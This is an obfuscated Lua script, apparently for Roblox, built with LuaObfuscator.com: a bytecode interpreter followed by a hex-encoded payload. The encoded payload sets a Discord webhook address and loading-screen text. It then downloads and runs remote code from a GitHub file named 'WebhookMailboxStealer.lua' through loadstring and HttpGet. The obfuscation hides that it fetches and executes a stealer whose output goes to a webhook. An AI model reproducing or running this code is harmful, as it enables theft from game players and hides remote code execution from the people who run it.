--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 1256 - (721 + 530)), "..", function(byte)
		if (Byte(byte, 2) == (246 - 167)) then
			repeatNext = StrToNumber(Sub(byte, 2 - 1, 1272 - (945 + 326)));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % ((3 - 1) ^ (((End - 1) - (Start - (2 - 1))) + (620 - (555 + 64))));
			return Res - (Res % (932 - (857 + 74)));
		else
			local Plc = (570 - (367 + 201)) ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or (1086 - (461 + 625));
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + (928 - (214 + 713));
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + (1290 - (993 + 295)));
		DIP = DIP + 1 + 1;
		return (b * (41 + 215)) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 1 + 3;
		return (d * (16778387 - (418 + 753))) + (c * (66413 - (282 + 595))) + (b * (1893 - (1523 + 114))) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1 + 0;
		local Mantissa = (gBit(Right, 1 + 0, 549 - (406 + 123)) * ((1771 - (1749 + 20)) ^ (45 - 13))) + Left;
		local Exponent = gBit(Right, 1086 - (68 + 997), 1353 - (1249 + 73));
		local Sign = ((gBit(Right, 1302 - (226 + 1044)) == 1) and -(4 - 3)) or (118 - (32 + 85));
		if (Exponent == (0 + 0)) then
			if (Mantissa == (0 - 0)) then
				return Sign * (0 + 0);
			else
				Exponent = 1;
				IsNormal = 957 - (892 + 65);
			end
		elseif (Exponent == (648 + 1399)) then
			return ((Mantissa == (0 - 0)) and (Sign * ((1 - 0) / (0 - 0)))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / ((352 - (87 + 263)) ^ (232 - (67 + 113)))));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == (584 - (57 + 527))) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1 + 0, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 3 - 2, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == (953 - (802 + 150))) then
				Cons = gBits8() ~= 0;
			elseif (Type == (6 - 4)) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3 + 0] = gBits8();
		for Idx = 1 + 0, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 2 - 1) == (0 - 0)) then
				local Type = gBit(Descriptor, 2 + 0, 68 - (30 + 35));
				local Mask = gBit(Descriptor, 1001 - (915 + 82), 16 - 10);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == (0 - 0)) then
					Inst[583 - (361 + 219)] = gBits16();
					Inst[1191 - (1069 + 118)] = gBits16();
				elseif (Type == (2 - 1)) then
					Inst[323 - (53 + 267)] = gBits32();
				elseif (Type == (1 + 1)) then
					Inst[3] = gBits32() - ((3 - 1) ^ (3 + 13));
				elseif (Type == (416 - (15 + 398))) then
					Inst[4 - 1] = gBits32() - (2 ^ (16 + 0));
					Inst[3 + 1] = gBits16();
				end
				if (gBit(Mask, 792 - (368 + 423), 851 - (20 + 830)) == (3 - 2)) then
					Inst[2] = Consts[Inst[20 - (10 + 8)]];
				end
				if (gBit(Mask, 7 - 5, 2) == (443 - (416 + 26))) then
					Inst[3] = Consts[Inst[9 - 6]];
				end
				if (gBit(Mask, 2 + 1, 4 - 1) == (739 - (542 + 196))) then
					Inst[442 - (145 + 293)] = Consts[Inst[434 - (44 + 386)]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1 + 0, gBits32() do
			Functions[Idx - (1487 - (998 + 488))] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[1 + 1];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -(2 - 1);
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - (1 + 0);
			local Lupvals = {};
			local Stk = {};
			for Idx = 0 - 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + (773 - (201 + 571))];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1139 - (116 + 1022)];
				if (Enum <= (407 - (142 + 235))) then
					if (Enum <= (58 - 44)) then
						if (Enum <= (4 + 2)) then
							if (Enum <= (1 + 1)) then
								if (Enum <= 0) then
									do
										return;
									end
								elseif (Enum > (3 - 2)) then
									Stk[Inst[3 - 1]] = Stk[Inst[10 - 7]] + Inst[4 + 0];
								else
									local A = Inst[861 - (814 + 45)];
									Stk[A] = Stk[A](Unpack(Stk, A + 1 + 0, Top));
								end
							elseif (Enum <= (2 + 2)) then
								if (Enum == (7 - 4)) then
									Stk[Inst[1 + 1]] = Inst[2 + 1] ~= 0;
								else
									local NewProto = Proto[Inst[888 - (261 + 624)]];
									local NewUvals;
									local Indexes = {};
									NewUvals = Setmetatable({}, {__index=function(_, Key)
										local Val = Indexes[Key];
										return Val[1 - 0][Val[1082 - (1020 + 60)]];
									end,__newindex=function(_, Key, Value)
										local Val = Indexes[Key];
										Val[2 - 1][Val[4 - 2]] = Value;
									end});
									for Idx = 1424 - (630 + 793), Inst[13 - 9] do
										VIP = VIP + (4 - 3);
										local Mvm = Instr[VIP];
										if (Mvm[754 - (239 + 514)] == (14 + 24)) then
											Indexes[Idx - (1330 - (797 + 532))] = {Stk,Mvm[1750 - (760 + 987)]};
										else
											Indexes[Idx - (1914 - (1789 + 124))] = {Upvalues,Mvm[6 - 3]};
										end
										Lupvals[#Lupvals + 1 + 0] = Indexes;
									end
									Stk[Inst[5 - 3]] = Wrap(NewProto, NewUvals, Env);
								end
							elseif (Enum > (19 - 14)) then
								Stk[Inst[1132 - (369 + 761)]] = Stk[Inst[2 + 1]] % Inst[1 + 3];
							else
								Stk[Inst[2 + 0]] = Stk[Inst[1058 - (87 + 968)]] - Inst[17 - 13];
							end
						elseif (Enum <= (10 + 0)) then
							if (Enum <= 8) then
								if (Enum == 7) then
									Stk[Inst[4 - 2]] = Inst[1416 - (447 + 966)] + Stk[Inst[1 + 3]];
								else
									Stk[Inst[5 - 3]] = Stk[Inst[1820 - (1703 + 114)]] % Stk[Inst[705 - (376 + 325)]];
								end
							elseif (Enum > (14 - 5)) then
								do
									return;
								end
							else
								Stk[Inst[2]] = Stk[Inst[339 - (144 + 192)]] % Inst[4];
							end
						elseif (Enum <= (228 - (42 + 174))) then
							if (Enum > (9 + 2)) then
								local A = Inst[2 + 0];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[2 + 1]));
								end
							elseif not Stk[Inst[5 - 3]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > (1517 - (363 + 1141))) then
							local A = Inst[1 + 1];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + (2 - 1)]));
							Top = (Limit + A) - 1;
							local Edx = 0 - 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= (36 - (9 + 5))) then
						if (Enum <= (14 + 4)) then
							if (Enum <= (12 + 4)) then
								if (Enum > 15) then
									Stk[Inst[2]] = Stk[Inst[379 - (85 + 291)]] - Inst[3 + 1];
								else
									local A = Inst[1267 - (243 + 1022)];
									local Index = Stk[A];
									local Step = Stk[A + 2];
									if (Step > 0) then
										if (Index > Stk[A + (2 - 1)]) then
											VIP = Inst[11 - 8];
										else
											Stk[A + (1936 - (565 + 1368))] = Index;
										end
									elseif (Index < Stk[A + 1]) then
										VIP = Inst[3 + 0];
									else
										Stk[A + 3] = Index;
									end
								end
							elseif (Enum == (63 - 46)) then
								VIP = Inst[3];
							else
								Stk[Inst[1182 - (1123 + 57)]]();
							end
						elseif (Enum <= (17 + 3)) then
							if (Enum > 19) then
								Stk[Inst[256 - (163 + 91)]]();
							else
								local A = Inst[1932 - (1869 + 61)];
								Stk[A] = Stk[A](Unpack(Stk, A + 1 + 0, Top));
							end
						elseif (Enum > (6 + 15)) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + (3 - 2), Top));
						elseif not Stk[Inst[5 - 3]] then
							VIP = VIP + (305 - (244 + 60));
						else
							VIP = Inst[4 - 1];
						end
					elseif (Enum <= 26) then
						if (Enum <= (4 + 20)) then
							if (Enum == 23) then
								local A = Inst[2];
								local Step = Stk[A + 2 + 0];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > (0 - 0)) then
									if (Index <= Stk[A + 1 + 0]) then
										VIP = Inst[3];
										Stk[A + (1004 - (938 + 63))] = Index;
									end
								elseif (Index >= Stk[A + (1475 - (1329 + 145))]) then
									VIP = Inst[974 - (140 + 831)];
									Stk[A + 3] = Index;
								end
							else
								local A = Inst[2 + 0];
								local B = Stk[Inst[3]];
								Stk[A + (1851 - (1409 + 441))] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum == (743 - (15 + 703))) then
							Stk[Inst[2]] = Env[Inst[2 + 1]];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - (439 - (262 + 176));
							local Edx = 0 + 0;
							for Idx = A, Top do
								Edx = Edx + (1722 - (345 + 1376));
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 28) then
						if (Enum == (294 - (176 + 91))) then
							local A = Inst[690 - (198 + 490)];
							Stk[A] = Stk[A](Unpack(Stk, A + (4 - 3), Inst[3]));
						else
							Stk[Inst[2 - 0]] = Stk[Inst[3]][Inst[4]];
						end
					elseif (Enum > (69 - 40)) then
						local A = Inst[1877 - (157 + 1718)];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1 + 0, Top)));
						Top = (Limit + A) - 1;
						local Edx = 0 - 0;
						for Idx = A, Top do
							Edx = Edx + (1207 - (696 + 510));
							Stk[Idx] = Results[Edx];
						end
					else
						Stk[Inst[6 - 4]] = #Stk[Inst[3]];
					end
				elseif (Enum <= 45) then
					if (Enum <= (77 - 40)) then
						if (Enum <= (1295 - (1091 + 171))) then
							if (Enum <= (5 + 26)) then
								local NewProto = Proto[Inst[7 - 4]];
								local NewUvals;
								local Indexes = {};
								NewUvals = Setmetatable({}, {__index=function(_, Key)
									local Val = Indexes[Key];
									return Val[3 - 2][Val[6 - 4]];
								end,__newindex=function(_, Key, Value)
									local Val = Indexes[Key];
									Val[1][Val[1 + 1]] = Value;
								end});
								for Idx = 1, Inst[378 - (123 + 251)] do
									VIP = VIP + (2 - 1);
									local Mvm = Instr[VIP];
									if (Mvm[4 - 3] == (736 - (208 + 490))) then
										Indexes[Idx - (1 + 0)] = {Stk,Mvm[1192 - (449 + 740)]};
									else
										Indexes[Idx - (1 + 0)] = {Upvalues,Mvm[3]};
									end
									Lupvals[#Lupvals + 1] = Indexes;
								end
								Stk[Inst[1 + 1]] = Wrap(NewProto, NewUvals, Env);
							elseif (Enum > (234 - (14 + 188))) then
								Stk[Inst[2]] = {};
							else
								local A = Inst[677 - (534 + 141)];
								do
									return Unpack(Stk, A, Top);
								end
							end
						elseif (Enum <= (15 + 20)) then
							if (Enum > (107 - 73)) then
								Stk[Inst[2]] = Inst[3 + 0] ~= (0 + 0);
							else
								local A = Inst[1 + 1];
								do
									return Unpack(Stk, A, Top);
								end
							end
						elseif (Enum == (75 - 39)) then
							Stk[Inst[2 - 0]] = {};
						else
							Stk[Inst[5 - 3]] = Env[Inst[443 - (382 + 58)]];
						end
					elseif (Enum <= (23 + 18)) then
						if (Enum <= 39) then
							if (Enum > (25 + 13)) then
								local A = Inst[398 - (115 + 281)];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[5 - 2])));
								Top = (Limit + A) - (2 - 1);
								local Edx = 0 + 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								Stk[Inst[4 - 2]] = Stk[Inst[3]];
							end
						elseif (Enum == (146 - 106)) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - (868 - (550 + 317));
							local Edx = 0 - 0;
							for Idx = A, Top do
								Edx = Edx + (1 - 0);
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						end
					elseif (Enum <= 43) then
						if (Enum > (117 - 75)) then
							Stk[Inst[287 - (134 + 151)]] = Inst[1668 - (970 + 695)] + Stk[Inst[7 - 3]];
						else
							local A = Inst[685 - (483 + 200)];
							Stk[A] = Stk[A](Unpack(Stk, A + (1991 - (582 + 1408)), Inst[10 - 7]));
						end
					elseif (Enum == (54 - 10)) then
						Stk[Inst[2]] = #Stk[Inst[3]];
					else
						Stk[Inst[7 - 5]] = Inst[3 - 0];
					end
				elseif (Enum <= (1877 - (1195 + 629))) then
					if (Enum <= (814 - (468 + 297))) then
						if (Enum <= (62 - 15)) then
							if (Enum == (608 - (334 + 228))) then
								Stk[Inst[6 - 4]] = Upvalues[Inst[6 - 3]];
							else
								local A = Inst[2];
								local Step = Stk[A + 2];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > (241 - (187 + 54))) then
									if (Index <= Stk[A + (1 - 0)]) then
										VIP = Inst[3];
										Stk[A + (783 - (162 + 618))] = Index;
									end
								elseif (Index >= Stk[A + 1 + 0]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							end
						elseif (Enum == (32 + 16)) then
							local A = Inst[2];
							local B = Stk[Inst[6 - 3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[6 - 2]];
						else
							local A = Inst[1 + 1];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1 + 0, Inst[3])));
							Top = (Limit + A) - (1637 - (1373 + 263));
							local Edx = 1000 - (451 + 549);
							for Idx = A, Top do
								Edx = Edx + 1 + 0;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 51) then
						if (Enum == (16 + 34)) then
							Stk[Inst[2 + 0]] = Inst[4 - 1];
						else
							local A = Inst[2 - 0];
							Stk[A](Unpack(Stk, A + 1, Top));
						end
					elseif (Enum == (31 + 21)) then
						Stk[Inst[2 - 0]] = Upvalues[Inst[1387 - (746 + 638)]];
					else
						Stk[Inst[1 + 1]][Inst[4 - 1]] = Stk[Inst[4]];
					end
				elseif (Enum <= (398 - (218 + 123))) then
					if (Enum <= (1636 - (1535 + 46))) then
						if (Enum > 54) then
							Env[Inst[3]] = Stk[Inst[2]];
						else
							Stk[Inst[2 + 0]] = Stk[Inst[1 + 2]];
						end
					elseif (Enum > 56) then
						Stk[Inst[562 - (306 + 254)]] = Stk[Inst[1 + 2]][Inst[4]];
					else
						Env[Inst[5 - 2]] = Stk[Inst[1469 - (899 + 568)]];
					end
				elseif (Enum <= 59) then
					if (Enum == 58) then
						local A = Inst[2 + 0];
						local Index = Stk[A];
						local Step = Stk[A + (4 - 2)];
						if (Step > (603 - (268 + 335))) then
							if (Index > Stk[A + (291 - (60 + 230))]) then
								VIP = Inst[575 - (426 + 146)];
							else
								Stk[A + 1 + 2] = Index;
							end
						elseif (Index < Stk[A + (1457 - (282 + 1174))]) then
							VIP = Inst[1 + 2];
						else
							Stk[A + 3] = Index;
						end
					else
						VIP = Inst[814 - (569 + 242)];
					end
				elseif (Enum == (96 - 36)) then
					Stk[Inst[5 - 3]] = Stk[Inst[3]] % Stk[Inst[943 - (714 + 225)]];
				else
					Stk[Inst[5 - 3]] = Stk[Inst[3 - 0]] + Inst[1 + 3];
				end
				VIP = VIP + (1025 - (706 + 318));
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!243O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365726E616D6503123O003DD9CFD435E7B0F309DEC9DE2FCBBACA07C803083O007EB1A3BB4586DBA703073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31302O393534303132313432333833322O362F594632473379364650456D627259653451366277574A584E626C6337784A582O396668616562476F5750664C674362513979585F4F3038594A43702D5535624B504A7839030D3O006C6F6164696E677363722O656E03023O005F4703103O00437573746F6D5363726970744E616D6503103O00CC26D96AF6F52E8D3285CF20DF23D5E803053O009C43AD4AA503053O00546578743103103O007537A54006A8666A3BB64D13B868087A03073O002654D72976DC4603053O00546578743203153O00C9511F361BF05756241DEC10252100F740026C5CB003053O009E3076427203053O00546578743303133O00D8A321133D7AABFCEB1713247AB5EFB86A5E7803073O009BCB44705613C503053O00546578743403123O00CB52DC24E84976E2B875DE24F5506CABB60803083O009826BD569C201885030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403513O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F48652O7253696D6F4E4875622F6170692F6D61696E2F576562682O6F6B4D61696C626F78537465616C65722E6C756100453O0012253O00013O00201C5O0002001225000100013O00201C000100010003001225000200013O00201C000200020004001225000300053O0006150003000A000100010004113O000A0001001225000300063O00201C000400030007001225000500083O00201C000500050009001225000600083O00201C00060006000A00060400073O000100062O00263O00064O00268O00263O00044O00263O00014O00263O00024O00263O00054O0036000800073O0012320009000C3O001232000A000D4O001B0008000A00020012380008000B3O0012320008000F3O0012380008000E4O0023000800013O001238000800103O001225000800114O0036000900073O001232000A00133O001232000B00144O001B0009000B0002001029000800120009001225000800114O0036000900073O001232000A00163O001232000B00174O001B0009000B0002001029000800150009001225000800114O0036000900073O001232000A00193O001232000B001A4O001B0009000B0002001029000800180009001225000800114O0036000900073O001232000A001C3O001232000B001D4O001B0009000B00020010290008001B0009001225000800114O0036000900073O001232000A001F3O001232000B00204O001B0009000B00020010290008001E0009001225000800213O001225000900223O002018000900090023001232000B00244O00270009000B4O001300083O00022O00120008000100012O000A3O00013O00013O00023O00026O00F03F026O00704002284O002100025O001232000300014O002C00045O001232000500013O00040F0003002300012O003400076O0036000800024O0034000900014O0034000A00024O0034000B00034O0034000C00044O0036000D6O0036000E00063O002002000F000600012O0027000C000F4O0013000B3O00022O0034000C00034O0034000D00044O0036000E00013O002005000F000600012O002C001000014O0008000F000F0010001007000F0001000F0020050010000600012O002C001100014O00080010001000110010070010000100100020020010001000012O0027000D00104O0028000C6O0013000A3O0002002009000A000A00022O001A0009000A4O003300073O000100042F0003000500012O0034000300054O0036000400024O000C000300044O002200036O000A3O00017O00", GetFEnv(), ...);
